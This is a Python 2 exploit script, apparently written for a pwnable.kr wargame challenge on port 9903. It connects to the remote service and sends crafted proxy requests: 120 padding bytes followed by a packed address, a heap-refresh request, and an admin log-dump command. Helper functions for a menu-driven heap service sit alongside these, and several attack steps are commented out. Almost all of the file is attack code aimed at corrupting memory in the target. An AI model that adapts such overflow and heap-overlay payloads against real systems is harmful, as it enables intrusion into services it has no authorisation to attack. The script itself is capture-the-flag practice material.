__author__ = 'HuyNA'
import struct
import socket
import telnetlib
import hexdump
import time

#
def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def beauty_print(data):
    hexdump.hexdump(data)

def read_hex(data):
    return hexdump.restore(data)

# from '\x11\x22' => '1122'
def print_hex_string(data):
    return data.encode('hex')

def pq(v):
    return struct.pack('<Q', v)

def uq(v):
    return struct.unpack('<Q', v)[0]

def pi(v):
    return struct.pack('<I', v)

def ui(v):
    return struct.unpack('<I', v)[0]


def write_entry(f, index, data):
    f.write('2\n')
    f.write(str(index) + '\n')
    f.write(str(len(data)) + '\n')
    f.write(data)
    assert f.readline().strip() == 'OK'

def free_entry(f, index):
    f.write('3\n')
    f.write(str(index) + '\n')
    assert f.readline().strip() == 'OK'

def printf_entry(f, index, delim='END\n'):
    f.write('3\n')
    f.write(str(index) + '\n')
    resp = readuntil(f, delim)[:-len(delim)]
    assert f.readline().strip() == 'OK'
    return resp

def do_printf(f, index, fmt):
    write_entry(f, index, fmt + 'END\n\0')
    return printf_entry(f, index)

def allocate_entry(f, length):
    f.write('1\n')
    f.write(str(length) + '\n')
    index = int(f.readline())
    assert f.readline().strip() == 'OK'
    return index

def strlen_entry(f, index):
    f.write('4\n')
    f.write(str(index) + '\n')
    msg = f.readline().strip()
    assert f.readline().strip() == 'OK'
    return msg

def final_interact():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def demo():
    data='00 11 22 33 44 55 66 77  88 99 AA BB CC DD EE FF'
    a = read_hex(data)
    print a.encode('hex')
    print type(a)
    beauty_print('kdfjiefoefjkafjieo\x11\x12')

# nc pwnable.kr 9903
#s = socket.create_connection(('192.168.248.133', 9903))
s = socket.create_connection(('pwnable.kr', 9903))

def list_proxy(s):
    buffer1 = 'admincmd_proxy_dump_log\n'
    s.send(buffer1)
    time.sleep(0.01)
    print s.recv(2014)
dump_address = pi(0x0804A0F0)
def add_one_proxy(s,overlay):
    operation = "GET "
    proxy_server_name = '://'+'a'*120 + overlay   # maxsize = 120
    proxy_server_port = '8080'
    data = '\rUser-Agent:\r'+'Connection:\raaaaaaaaaaaaaaaaaaaa'
    buffer_2_send = operation+proxy_server_name+':'+proxy_server_port+data
    s.send(buffer_2_send)
    print buffer_2_send
    time.sleep(0.01)
    #print s.recv(2013)
def refresh_heap(s):
    operation = "GET "
    proxy_server_name = '://'+'a'*250
    proxy_server_port = '8080'
    data = '\rUser-Agent:\r'+'Connection:\raaaaaaaaaaaaaaaaaaaa'
    buffer_2_send = operation+proxy_server_name+':'+proxy_server_port+data
    s.send(buffer_2_send)
    print buffer_2_send
    time.sleep(0.01)
#for i in range(10):
#    print 'list '+str(i)
#    add_one_proxy(s)
#    time.sleep(0.1)
#refresh_heap(s)
#add_one_proxy(s,'')
#add_one_proxy(s,dump_address*2)
list_proxy(s)